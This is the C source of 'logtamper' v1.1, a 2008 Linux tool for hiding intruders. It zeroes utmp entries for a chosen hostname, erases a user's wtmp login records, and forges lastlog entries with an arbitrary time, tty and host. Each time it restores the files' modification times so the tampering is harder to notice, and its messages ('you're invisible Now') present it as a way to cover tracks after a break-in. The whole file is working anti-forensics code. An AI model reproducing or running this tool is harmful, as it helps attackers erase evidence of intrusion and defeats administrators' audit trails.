/*****************************************************************
  *	logtampler version 1.1 Author : xi4oyu < evil.xi4oyu@gmail.com >
  *       Date : 2008/11/27
  ******************************************************************/
#include "logtamper.h"
#include "reserve_time.h"
#include "str2time.h"    /* converts from "YYYY:MM:DD:hh:mm:ss:uuuuuu" to time_t*/


/*Help info*/
void usage(void){
		
	//printf("Usage:logtamper -l username			list username's wtmp records\n");
	printf("logtamper [-f utmp_filename] -h username hostname		hide username connected from hostname\n");
	printf("logtamper [-f wtmp_filename] -w username hostname		erase username from hostname in wtmp file\n");
	printf("logtamper [-f lastlog_filename] -m username hostname ttyname YYYY[:MM[:DD[:hh[:mm[:ss]]]]]  modify lastlog info\n");

}

int main(int argc,char **argv){
		
		char *username = NULL;
		char *hostname = NULL;
		char *ttyname  = NULL;
		char *str_time = NULL;
		char *filename = NULL;
		
		int ch,ret;
		int lflag = 0,hflag = 0,wflag = 0,mflag = 0;
		
		
		printf("Logtamper v 1.1 for linux\n");
		printf("Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>\n\n");
		
		while((ch = getopt(argc,argv,"l:f:hwm"))!= EOF){
		
			switch(ch){
				case 'f': 	/*hideUser*/
					filename = optarg;
					break;
				case 'l': 	/*listLogInfo*/
					lflag = 1;
					break;
				case 'h': 	/*hideUser*/
					hflag = 1;
					break;
				case 'w': 	/*hideUser*/
					wflag = 1;
					break;
				case 'm': 	/*hideUser*/
					mflag = 1;
					break;
				default:
					usage();
					exit(1);

			}	

		}
	
	if(!(lflag||hflag||mflag||wflag)){
		usage();
	
	}
	if(lflag){ /*list user login &logout info*/
		
		ret = listLogInfo(username);
			
		if(ret < 0){
			printf("listLogInfo Failed\n!");
			exit(1);
		}
		
		
	}else if(hflag){
		if(optind +1 >= argc){
			usage();
			exit(1);
		}
		
		username = argv[optind];
		hostname = argv[optind+1];
			
		ret = hideUser(filename,username,hostname);
			
		if(ret < 0){
			printf("hideUser Failed\n!");
			exit(1);
		}
			
		printf("Seems you're invisible Now...Check it out!\n");
			
	}else if(wflag){
	
		username = argv[optind];
		hostname = argv[optind+1];
		
		if(optind +1 >= argc){
			usage();
			exit(1);
		}
		ret = eraseUser(filename,username,hostname);
		
		if(ret < 0){
			printf("eraseUser Failed\n!");
			exit(1);
		}
			
		printf("Aho,you are now invisible to last...Check it out!\n");	
		
	
	
	}else if(mflag){
		if(optind +3 >= argc){
			usage();
			exit(1);
		}
		
		username = argv[optind];
		hostname = argv[optind+1];
		ttyname  = argv[optind+2];
		str_time = argv[optind+3];
		
		ret = editLastLog(filename,username,hostname,ttyname,str_time);
		
		if(ret < 0){
			printf("Edit Lastlog  Failed\n!");
			exit(1);
		}
			
		printf("Aho, now you never come here before...Check it out!\n");	
		
	}
		
	return 0;




}

int hideUser(const char * filename,const char *username,const char *hostname){
	
	
	int fd,ret;
	struct utmpx utmp_ent;
	
	if(NULL == filename)
		filename = UTMPFILE;
	
	ret = save_time(filename);
	if(ret < 0){
		perror("Stat UTMPFILE");
	}
	
	if ((fd=open(filename,O_RDWR))>=0) { 
	
		while(read (fd, &utmp_ent, sizeof (utmp_ent))> 0 ) {
		
			if (!strncmp(utmp_ent.ut_host,hostname,strlen(hostname))) { 
				bzero((char *)&utmp_ent,sizeof( utmp_ent )); 
				lseek (fd, -(sizeof (utmp_ent)), SEEK_CUR); 
				write (fd, &utmp_ent, sizeof (utmp_ent)); 
			}
			
		}/*end of while*/
		
	}else {
		perror("Open UTMPFILE");
		return -1;
	}/*end of if*/
	
	close(fd);
	
	restore_time(filename);
	
	return 0;
}

int listLogInfo(const char *username){


	return 0;
}

int eraseUser(const char *filename,const char *username,const char *hostname){
	
	int ret=0;
	static struct utmpx *utp;
	
	
	if(NULL == filename)
		filename = WTMPFILE;
	
	save_time(filename);
	
	utmpname(filename);
	setutxent ();
	
	
	while ((utp = getutxent ())){
          if (utp->ut_type == USER_PROCESS &&
		  	  strncmp (utp->ut_host ,hostname,sizeof utp->ut_host)== 0 &&
              strncmp (utp->ut_user, username, sizeof utp->ut_user) == 0){
			  
			  memset(utp,0,sizeof utp);
              utp->ut_type = DEAD_PROCESS;

			if (pututxline (utp)){
				ret++;
			}else{
                ret++;
			}
          }/*end of if*/
		  
      }/*end of while*/

    endutxent ();
	
	
	restore_time(filename);
	return ret;
}


int editLastLog(const char *filename,const char *username,const char *hostname,
									const char *ttyname,const char *str_time){
		
		
		struct passwd *p;
        struct lastlog ent;
		struct utimbuf currtime;
		int fd;
		
		memset(&ent,0,sizeof(struct lastlog));

		if(NULL == filename)
			filename = LASTLOGFILE;
			
		
		
		save_time(filename);
		
		if ((p=getpwnam(username))==NULL){
            perror ("User doesn't exist...\n");
            exit (1);
        }
		
		
		if ((fd=open(filename,O_RDWR))<=0) {
            perror ("can't open lastlog file...\n");
            exit (1);
        }
		
		strncpy(ent.ll_line,ttyname,strlen(ttyname));
        strncpy(ent.ll_host,hostname,strlen(hostname));
		ent.ll_time = str2time(str_time);
		
		lseek(fd,p->pw_uid*sizeof(struct lastlog),SEEK_SET);

        write(fd,&ent,sizeof(struct lastlog));

        close(fd);
	
		restore_time(filename);	

		return 0;
									
}
